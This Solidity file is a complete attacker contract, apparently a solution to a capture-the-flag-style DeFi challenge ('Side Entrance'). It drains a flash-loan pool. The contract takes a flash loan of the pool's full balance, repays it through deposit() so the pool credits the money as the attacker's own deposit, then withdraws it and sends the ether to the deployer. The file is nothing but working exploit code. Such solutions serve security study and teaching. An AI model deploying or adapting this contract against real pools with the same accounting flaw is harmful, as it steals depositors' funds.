// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    ISideEntranceLenderPool immutable pool;
    uint immutable etherInPool;
    address payable immutable attacker = payable(msg.sender);

    constructor(address _pool, uint _etherInPool) {
        pool = ISideEntranceLenderPool(_pool);
        etherInPool = _etherInPool;
    }

    function pwn() external {
        pool.flashLoan(etherInPool);
        pool.withdraw();
        attacker.transfer(address(this).balance);
    }

    function execute() external payable override {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
